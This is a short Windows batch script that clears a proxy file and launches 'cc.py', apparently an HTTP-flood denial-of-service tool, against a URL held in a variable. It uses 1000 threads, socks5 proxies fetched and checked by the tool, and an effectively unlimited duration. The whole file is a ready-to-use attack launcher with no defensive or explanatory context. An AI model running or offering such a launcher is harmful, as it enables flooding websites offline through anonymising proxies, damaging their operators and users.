@echo off
del socks5.txt
python cc.py -url %SETURL% -m cc -v 5 -t 1000 -f socks5.txt -b 1 -s 999999999999999 -down -check
